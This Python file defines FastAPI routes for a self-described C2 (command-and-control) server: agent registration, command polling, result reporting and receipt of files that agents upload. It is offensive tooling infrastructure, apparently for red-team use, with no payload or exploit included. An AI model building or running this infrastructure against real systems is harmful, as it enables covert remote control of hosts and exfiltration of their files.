"""
Agent Communication Routes
Handles agent registration, command polling, and result reporting
"""

import random
import shutil
from pathlib import Path
from fastapi import APIRouter, Request, HTTPException, UploadFile, File

from core.agent import Agent
from models import Commands, CommandResult
from config import agents, UPLOAD_DIR, MAX_FILE_SIZE


router = APIRouter(prefix="/agent", tags=["agent-communication"])


# Note: /join route is registered in main.py without prefix
def create_agent(hostname: str, user: str, request: Request):
    """Register a new agent with the C2 server"""
    # Generate a random agent ID that doesn't already exist
    attempts = 0
    max_attempts = 100
    agent_id = random.randint(100000, 999999)  # 6-digit IDs

    while agent_id in agents and attempts < max_attempts:
        agent_id = random.randint(100000, 999999)
        attempts += 1

    if agent_id in agents:
        raise HTTPException(status_code=500, detail="Failed to generate unique agent ID")

    ag = Agent(agent_id, request.client.host, hostname, user)
    agents[agent_id] = ag

    return {'id': agent_id, "status": True}


@router.get("/get_commands/{agent_id}")
def get_commands(agent_id: int):
    """Agent polls for pending commands"""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")
    ag: Agent = agents[agent_id]
    ag.update_last_seen()  # Update last seen on every poll
    commands = ag.get_commands()
    return {'commands': commands}


@router.post("/set_commands")
def set_commands(commands: Commands):
    """Legacy endpoint - for backward compatibility"""
    if commands.agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {commands.agent_id} not found")
    ag: Agent = agents[commands.agent_id]
    for command in commands.commands:
        ag.set_result(command.command_id, "success", result=command.result)
    return {'status': True}


@router.post("/set_command_result")
def set_command_result(command: CommandResult):
    """Agent reports command execution result"""
    if command.agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {command.agent_id} not found")
    ag: Agent = agents[command.agent_id]

    # Get command info before setting result
    command_info = ag.commands.get(command.command_id)

    success = ag.set_result(command.command_id, command.status, command.result, command.error)
    if not success:
        raise HTTPException(status_code=404, detail=f"Command {command.command_id} not found")

    # If set_sleep_time command succeeded, update agent's sleep_time
    if command_info and command_info['type'] == 'set_sleep_time' and command.status == 'success':
        new_sleep_time = command_info['data'].get('sleep_time')
        if new_sleep_time:
            ag.set_sleep_time(new_sleep_time)

    return {'status': True, 'message': 'Result recorded'}


@router.post("/upload_file")
async def agent_upload_file(agent_id: int, file: UploadFile = File(...)):
    """
    Agent uploads a file to the server
    This is called by the agent when executing an 'upload' command
    """
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")

    # Sanitize filename to prevent path traversal
    safe_filename = Path(file.filename).name

    # Create agent-specific directory
    agent_dir = UPLOAD_DIR / f"agent_{agent_id}"
    agent_dir.mkdir(exist_ok=True)

    # Save the uploaded file
    file_path = agent_dir / safe_filename

    # Check file size
    file.file.seek(0, 2)
    file_size = file.file.tell()
    file.file.seek(0)

    if file_size > MAX_FILE_SIZE:
        raise HTTPException(status_code=413, detail=f"File too large (max {MAX_FILE_SIZE // (1024*1024)}MB)")

    with open(file_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)

    # Track the upload in agent
    ag: Agent = agents[agent_id]
    ag.add_uploaded_file(safe_filename, str(file_path), file_size)

    return {
        'status': 'success',
        'filename': safe_filename,
        'size': file_size
    }
